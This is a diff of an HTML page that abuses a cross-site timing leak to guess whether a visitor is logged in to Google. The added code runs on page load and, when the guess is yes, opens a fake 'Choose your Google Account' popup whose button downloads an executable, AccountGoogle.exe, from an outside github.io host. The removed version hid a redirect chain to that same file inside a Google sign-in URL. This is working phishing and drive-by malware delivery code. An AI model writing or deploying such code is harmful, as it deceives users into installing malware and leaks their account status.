@@ -1,56 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>XSLeak - Google Login Status Detection</title>
+  <meta charset="UTF-8">
+  <title>XSLeaks Google Login Detection</title>
 </head>
 <body>
+  <h2>Checking Google login status...</h2>
+  <div id="status">Detecting...</div>
 
-<h1>Google Login Detection</h1>
-<button id="detect-btn">Check if user is logged in to Google</button>
-<p id="result"></p>
+  <script>
+    function detectGoogleLogin(callback) {
+      const img = new Image();
+      const start = performance.now();
 
-<script>
-  const detectBtn = document.getElementById('detect-btn');
-  const result = document.getElementById('result');
+      // Target resource yang beda perilaku kalo login / nggak login
+      img.src = "https://mail.google.com/mail/u/0/images/cleardot.gif";
 
-  detectBtn.addEventListener('click', () => {
-    result.textContent = 'Checking...';
+      img.onload = () => {
+        const time = performance.now() - start;
+        console.log("Image loaded in:", time);
 
-    const start = performance.now();
+        // Kalau user login → cleardot.gif cepat ke-load
+        if (time < 500) {
+          callback(true); // Logged in!
+        } else {
+          callback(false); // Not logged in
+        }
+      };
 
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
+      img.onerror = () => {
+        console.log("Error loading image");
+        callback(false); // Assume not logged in
+      };
+    }
 
-    document.body.appendChild(iframe);
-
-    iframe.onload = () => {
-      const end = performance.now();
-      const loadTime = end - start;
-
-      console.log(`iframe loaded in ${loadTime}ms`);
-
-      // Threshold: diatur sesuai pengujian real
-      if (loadTime < 500) {
-        result.textContent = '✅ User is likely logged in to Google.';
+    detectGoogleLogin((loggedIn) => {
+      const status = document.getElementById('status');
+      if (loggedIn) {
+        status.textContent = "✅ User is logged into Google!";
+        triggerAttack();
       } else {
-        result.textContent = '❌ User is NOT logged in to Google.';
+        status.textContent = "❌ User is NOT logged in to Google!";
       }
+    });
 
-      document.body.removeChild(iframe);
-    };
+    function triggerAttack() {
+      alert("Launching attack on logged-in user...");
 
-    // Safety timeout kalau iframe ga load sama sekali
-    setTimeout(() => {
-      if (document.body.contains(iframe)) {
-        result.textContent = '❓ Unable to detect (timeout).';
-        document.body.removeChild(iframe);
-      }
-    }, 3000);
-  });
-</script>
+      // Bisa trigger fake popup login atau drive-by download
+      const popup = window.open('', 'GoogleLogin', 'width=500,height=600');
 
+      popup.document.write(`
+        <html>
+        <head><title>Google Login</title></head>
+        <body style="text-align:center;">
+          <h2>Choose your Google Account</h2>
+          <button onclick="download()">Continue</button>
+
+          <script>
+            function download() {
+              window.location.href = 'https://lanaya113505.github.io/pizza/AccountGoogle.exe';
+            }
+          </script>
+        </body>
+        </html>
+      `);
+    }
+  </script>
 </body>
 </html>
